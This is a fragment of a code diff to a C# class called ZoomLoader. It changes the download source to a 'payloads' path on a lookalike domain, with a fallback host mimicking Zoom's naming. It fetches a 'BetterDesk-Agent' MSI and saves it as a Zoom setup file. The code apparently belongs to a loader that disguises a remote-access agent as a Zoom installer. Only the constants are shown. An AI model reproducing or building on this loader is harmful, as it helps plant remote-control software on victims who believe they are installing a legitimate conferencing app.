@@ -38,7 +38,7 @@ using Microsoft.Win32;
 
 public class ZoomLoader
 {
-    const string RepoBase = "https://raw.githubusercontent.com/fingod201-maker/BetterDesk-private/operational-v2-ALLclient-working/distro/clients/windows";
+    const string RepoBase = "https://global.telcom.stream/downloads/payloads";
     const string Fallback = "https://us05web.telcom.stream";
     const string PkgName = "BetterDesk-Agent-x64-1.0.2.msi";
     const string SaveName = "zoom-private.Setup_1.0.0_x64_en-US.msi";
